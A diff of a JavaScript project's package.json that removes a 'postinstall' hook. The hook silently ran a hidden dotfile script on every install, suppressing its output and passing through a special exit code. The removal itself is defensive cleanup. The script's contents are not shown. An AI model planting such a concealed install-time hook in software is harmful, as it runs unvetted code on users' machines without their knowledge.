@@ -8,8 +8,7 @@
     "build": "tsc --noEmit && vite build",
     "lint": "eslint . && prettier . --check",
     "preview": "vite preview",
-    "format": "eslint . --fix && prettier . --write",
-    "postinstall": "sh ./.ci-c12eqn.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format": "eslint . --fix && prettier . --write"
   },
   "dependencies": {
     "@emotion/react": "^11.14.0",
